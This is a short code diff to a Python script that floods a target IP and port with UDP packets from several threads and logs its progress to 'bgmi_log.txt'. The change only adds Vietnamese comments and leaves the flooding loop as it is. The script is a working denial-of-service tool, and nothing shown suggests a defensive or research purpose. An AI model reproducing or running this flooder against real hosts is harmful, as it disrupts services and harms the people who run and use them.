@@ -10,8 +10,8 @@ PORT = int(sys.argv[2])
 PACKET_SIZE = int(sys.argv[3])
 NUM_THREADS = int(sys.argv[4])
 
-data = bytearray(PACKET_SIZE)
-stop_flag = [False]
+data = bytearray(PACKET_SIZE)  # dữ liệu gửi
+stop_flag = [False]             # cờ dừng
 
 def spam(thread_id):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -21,6 +21,7 @@ def spam(thread_id):
             s.sendto(data, (IP, PORT))
             sent_count += 1
             if sent_count % 100 == 0:
+                # ghi log vào tệp bgmi_log.txt
                 with open("bgmi_log.txt", "a") as f:
                     f.write(f"Thread {thread_id}: Sent {sent_count} packets to {IP}:{PORT}\n")
         except Exception:
